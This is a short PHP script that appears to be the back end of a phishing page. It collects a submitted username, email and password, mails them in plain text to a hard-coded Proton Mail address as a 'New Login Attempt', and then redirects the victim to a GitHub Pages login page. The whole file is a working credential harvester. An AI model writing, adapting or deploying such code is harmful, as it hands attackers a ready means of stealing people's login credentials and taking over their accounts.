<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get form data and sanitize inputs
    $user = htmlspecialchars($_POST['user']);
    $email = htmlspecialchars($_POST['mail']);
    $password = htmlspecialchars($_POST['password']);

    // Define the recipient email and subject
    $to = "c33223322@proton.me";  // Replace with your email
    $subject = "New Login Attempt";

    // Create the message
    $message = "Username: $user\nEmail: $email\nPassword: $password";

    // Headers (from email address)
    $headers = "From: x33223322@proton.me";  // Replace with a valid 'from' email

    // Send the email
    if (mail($to, $subject, $message, $headers)) {
        // Redirect to a thank you page after successful email submission
        header("Location: https://goodleaks.github.io/login/");
        exit();
    } else {
        // If email fails to send, show an error message
        echo "Error sending email. Please try again later.";
    }
} else {
    echo "Invalid request.";
}
?>